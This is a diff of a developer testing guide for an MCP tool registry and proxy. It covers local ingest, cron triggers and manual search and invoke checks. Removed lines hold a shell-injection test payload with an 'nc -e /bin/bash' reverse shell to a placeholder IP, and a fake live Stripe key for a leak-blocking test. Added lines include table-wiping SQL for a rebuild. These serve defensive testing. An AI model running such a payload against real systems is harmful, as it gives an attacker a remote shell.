@@ -1,124 +1,181 @@
 # Testing Guide
 
-Last updated: 2026-04-23
+Last updated: 2026-04-24
 
-This guide focuses on the MVP core:
+This guide is the fastest path to testing the MVP without waiting on a huge live ingest before you learn anything.
 
-1. ingest / canonical registry state
-2. search
-3. invoke
-4. search -> invoke analytics linkage
+## 1. Local baseline
 
-## Quick Status
-
-Current validation baseline:
-
-- `npx tsc --noEmit`
-- `npm test -- --runInBand`
-
-Both should pass before manual testing.
-
-Important:
-
-- the automated test suite in this repo is Jest-based
-- use `npm test -- --runInBand`
-- do not use `bun test` for this suite unless the tests are rewritten for Bun's mocking API
-- for deterministic local search/invoke testing, use [PROTOTYPE_GUIDE.md](./PROTOTYPE_GUIDE.md)
-
-## Automated Checks
-
-### 1. TypeScript
-
-Run:
-
-```bash
-npx tsc --noEmit
-```
-
-Expected:
-
-- exit code `0`
-- no output
-
-### 2. Jest
-
-Run:
-
-```bash
-npm test -- --runInBand
-```
-
-Expected:
-
-- 3 test suites passed
-- 86 tests passed
-
-### 3. Fast repeat loop
-
-For quick regression testing while editing:
-
-```bash
-npx tsc --noEmit
-npm test -- --runInBand
-```
-
-If both are green, the core runtime path is in much better shape than before.
-
-## Manual Testing
-
-## Prerequisites
-
-You need a working local app environment with:
+Set up:
 
 - Supabase env vars
-- service role key
-- app URL / auth env vars
+- `SUPABASE_SERVICE_ROLE_KEY`
+- `CRON_SECRET`
+- optional: `SMITHERY_API_KEY`
+- optional but recommended for stdio extraction: `SANDBOX_URL` and `SANDBOX_AUTH_TOKEN`
 
 Start the app:
 
 ```bash
-npm run dev
+bun dev
 ```
 
-Assume local base URL:
+Run the baseline checks first:
 
-```text
-http://localhost:3000
+```bash
+npx tsc --noEmit
+npm test -- --runInBand
 ```
 
-## Test 1: MCP initialize
+Expected today:
 
-Send:
+- `4` test suites passed
+- `90` tests passed
+
+## 2. Know the cron cadence
+
+Current scheduled jobs from `vercel.json`:
+
+- ingest all sources: daily at `02:00 UTC`
+- uptime check: every `15 minutes`
+- schema drift: every `6 hours`
+- daily call reset: `00:00 UTC`
+
+If you were thinking of a 5-hour check, that is not the current schedule. The drift check is `6 hours`.
+
+## 3. Understand when you need a force reprocess
+
+Normal re-ingest is enough when upstream data changed.
+
+Force reprocess is needed when Relay logic changed but upstream rows did not, for example:
+
+- new sandbox setup
+- new README extraction logic
+- new transport detection logic
+- trust / scan persistence fixes
+
+Least-destructive force reprocess:
+
+```sql
+UPDATE public.servers
+SET schema_hash = NULL,
+    last_scanned_at = NULL;
+```
+
+Full clean rebuild:
+
+```sql
+DELETE FROM public.scan_results;
+DELETE FROM public.schema_snapshots;
+DELETE FROM public.cron_job_runs;
+DELETE FROM public.ingest_runs;
+DELETE FROM public.servers;
+```
+
+## 4. Fastest MVP testing path
+
+Do not start with `all` unless your goal is specifically a full-scale soak test.
+
+Use this order:
+
+1. `official`
+2. `partner`
+3. `github`
+4. `smithery` if your key is configured
+5. `glama`
+6. optional later: `claudemcp`, `mcpso`, `mcp_run`, `composio`
+
+Why this order:
+
+- `official` is the cleanest source
+- `partner` checks trusted-source behavior
+- `github` exercises README and stdio fallback behavior
+- `smithery` exercises the sandbox path if configured
+
+## 5. Trigger ingest locally
+
+One source at a time:
+
+```bash
+curl -X POST http://localhost:3000/api/ingest \
+  -H "Authorization: Bearer $CRON_SECRET" \
+  -H "Content-Type: application/json" \
+  -d '{"source":"official"}'
+```
+
+Then repeat with:
+
+- `partner`
+- `github`
+- `smithery`
+- `glama`
+
+Full ingest:
+
+```bash
+curl -X POST http://localhost:3000/api/ingest \
+  -H "Authorization: Bearer $CRON_SECRET" \
+  -H "Content-Type: application/json" \
+  -d '{"source":"all"}'
+```
+
+What to inspect after each source:
+
+- `/admin` ingest runs
+- `/admin` operations
+- row counts in `servers`
+- whether `transport`, `proxy_available`, `tools`, `tool_schemas`, `description_quality`, `scan_status`, and `trust_score` look sane
+
+## 6. Trigger the operational jobs manually
+
+After ingest, run the cron-backed jobs manually once so you are not waiting on the real schedule.
+
+```bash
+curl http://localhost:3000/api/cron/uptime-check \
+  -H "Authorization: Bearer $CRON_SECRET"
+```
+
+```bash
+curl http://localhost:3000/api/cron/schema-drift \
+  -H "Authorization: Bearer $CRON_SECRET"
+```
+
+```bash
+curl http://localhost:3000/api/cron/reset-daily-calls \
+  -H "Authorization: Bearer $CRON_SECRET"
+```
+
+This validates:
+
+- health probing
+- trust recomputation
+- schema drift handling
+- cron auth and admin visibility
+
+## 7. MVP manual product test
+
+After you have ingested at least `official` and `github`, test the MVP in this order.
+
+### A. MCP initialize
 
 ```bash
 curl -s http://localhost:3000/api/mcp-server \
   -H 'Content-Type: application/json' \
-  -d '{
-    "jsonrpc":"2.0",
-    "id":1,
-    "method":"initialize",
-    "params":{}
-  }'
+  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}'
 ```
 
 Expected:
 
-- JSON-RPC response
-- `protocolVersion` returned
-- `instructions` present
+- valid JSON-RPC response
+- `protocolVersion`
+- instructions present
 
-## Test 2: MCP tools/list
-
-Send:
+### B. MCP tools/list
 
 ```bash
 curl -s http://localhost:3000/api/mcp-server \
   -H 'Content-Type: application/json' \
-  -d '{
-    "jsonrpc":"2.0",
-    "id":2,
-    "method":"tools/list"
-  }'
+  -d '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'
 ```
 
 Expected:
@@ -126,9 +183,7 @@ Expected:
 - `search_tools`
 - `invoke_tool`
 
-## Test 3: MCP search_tools
-
-Send:
+### C. Search
 
 ```bash
 curl -s http://localhost:3000/api/mcp-server \
@@ -147,24 +202,12 @@ curl -s http://localhost:3000/api/mcp-server \
   }'
 ```
 
-Expected:
+Keep:
 
-- MCP JSON-RPC success response
-- text payload containing:
-  - `intent`
-  - `intent_hash`
-  - `search_event_id`
-  - `results`
+- `search_event_id`
+- `intent`
 
-Important:
-
-- keep the returned `search_event_id`
-- keep the original `intent`
-- pass both into `invoke_tool`
-
-## Test 4: REST search fallback compatibility
-
-Send:
+### D. REST search sanity check
 
 ```bash
 curl -s 'http://localhost:3000/api/servers/search?q=email&limit=5'
@@ -172,13 +215,10 @@ curl -s 'http://localhost:3000/api/servers/search?q=email&limit=5'
 
 Expected:
 
-- JSON response
-- no crash even if DB is on the 2-arg `search_servers(...)` function signature
-- each result should include transport/auth guidance
+- no RPC/signature crash
+- usable results
 
-## Test 5: invoke_tool unauthenticated
-
-Send:
+### E. Invoke without credentials
 
 ```bash
 curl -s http://localhost:3000/api/mcp-server \
@@ -200,14 +240,11 @@ curl -s http://localhost:3000/api/mcp-server \
 
 Expected:
 
-- structured auth failure
-- status `401` in the wrapped response
+- structured auth/setup guidance
 
-## Test 6: invoke_tool authenticated
+### F. Invoke with credentials
 
-First create or use an API key with prefix `sk_mcp_...`.
-
-Then call:
+Use a valid Relay API key and pass `search_event_id` + `intent` from the search step:
 
 ```bash
 curl -s http://localhost:3000/api/mcp-server \
@@ -222,7 +259,7 @@ curl -s http://localhost:3000/api/mcp-server \
       "arguments":{
         "server":"sendgrid-mail",
         "tool":"send_email",
-        "search_event_id":"<paste from search_tools>",
+        "search_event_id":"<paste from search>",
         "intent":"send a transactional email with html body",
         "args":{
           "to":"user@example.com",
@@ -236,137 +273,34 @@ curl -s http://localhost:3000/api/mcp-server \
 
 Expected:
 
-- successful result, or
-- structured upstream auth/setup guidance if that server requires credentials
+- success, or
+- structured upstream credential/setup guidance
 
-Most important validation:
+## 8. When to test with all sources
 
-- `search_event_id` and `intent` are now accepted by `invoke_tool`
-- that means successful invokes can feed `intent_server_mappings`
+Use `source="all"` only when you want one of these:
 
-## Test 7: DLP request blocking
+- final pre-launch population
+- performance and runtime observation
+- trust/search quality checks across the whole registry
+- admin dashboard validation under realistic data volume
 
-Send:
+For daily development, targeted source ingest is faster and gives clearer failure isolation.
 
-```bash
-curl -s -X POST http://localhost:3000/api/proxy/stripe/charge \
-  -H 'Authorization: Bearer sk_mcp_your_key_here' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "api_key":"sk_live_abcdefghijklmnopqrstuvwxyz0123",
-    "amount":4900
-  }'
-```
+## 9. Recommended MVP testing sequence
 
-Expected:
-
-- `400`
-- blocked due to credential leakage in request args
-
-## Test 8: Shell injection blocking
-
-Send:
-
-```bash
-curl -s -X POST http://localhost:3000/api/proxy/shell-test/run \
-  -H 'Authorization: Bearer sk_mcp_your_key_here' \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "command":"ls; nc -e /bin/bash 10.0.0.1 4444"
-  }'
-```
-
-Expected:
-
-- `400`
-- blocked due to shell injection detection
-
-## Test 9: Search -> Invoke learning path
-
-This is the key MVP validation.
-
-Steps:
-
-1. Run `search_tools`.
-2. Save `search_event_id`.
-3. Run `invoke_tool` with:
-   - `search_event_id`
-   - original `intent`
-4. Confirm invoke succeeds.
-5. Inspect DB:
-   - `search_events`
-   - `invoke_outcomes`
-   - `intent_server_mappings`
-
-Expected:
-
-- a `search_events` row exists for the search
-- an `invoke_outcomes` row exists for the invoke
-- the outcome row references the search event when provided
-- `intent_server_mappings` is updated for successful invokes
-
-## Database Verification Queries
-
-Use SQL in Supabase or your DB client.
-
-### Latest search events
-
-```sql
-select id, intent_text, intent_hash, top_server, created_at
-from public.search_events
-order by created_at desc
-limit 10;
-```
-
-### Latest invoke outcomes
-
-```sql
-select search_event_id, server_name, tool_name, status_code, success, created_at
-from public.invoke_outcomes
-order by created_at desc
-limit 10;
-```
-
-### Latest intent mappings
-
-```sql
-select intent_text, server_name, tool_name, invoke_count, success_count, failure_count, avg_latency_ms
-from public.intent_server_mappings
-order by last_invoked_at desc
-limit 10;
-```
-
-## What To Watch Closely
-
-### Search
-
-- no crash on `/api/servers/search`
-- `search_tools` returns `search_event_id`
-- `proxy_available` is not guessed optimistically for stdio rows
-
-### Invoke
-
-- unauthenticated invoke returns structured auth guidance
-- authenticated invoke accepts `sk_mcp_...`
-- DLP and shell blocking happen before upstream execution
-
-### Analytics
-
-- `invoke_tool` receives and forwards `search_event_id`
-- `intent` is forwarded and hashed
-- successful invokes can update intent mappings
-
-## Recommended Regression Checklist
-
-Run this before shipping:
+Use this exact order:
 
 1. `npx tsc --noEmit`
 2. `npm test -- --runInBand`
-3. manual `initialize`
-4. manual `tools/list`
-5. manual `search_tools`
-6. manual authenticated `invoke_tool`
-7. manual DLP block
-8. verify DB rows for `search_events`, `invoke_outcomes`, `intent_server_mappings`
+3. start local app
+4. ingest `official`
+5. ingest `github`
+6. if sandbox is configured, ingest `smithery`
+7. run manual uptime check
+8. run manual schema drift
+9. test `search_tools`
+10. test `invoke_tool`
+11. only then run `source="all"` if you want scale validation
 
-If all of those pass, the core MVP loop is functioning.
+That is the fastest path to confidence without paying the full cost of a live full-registry ingest on every iteration.
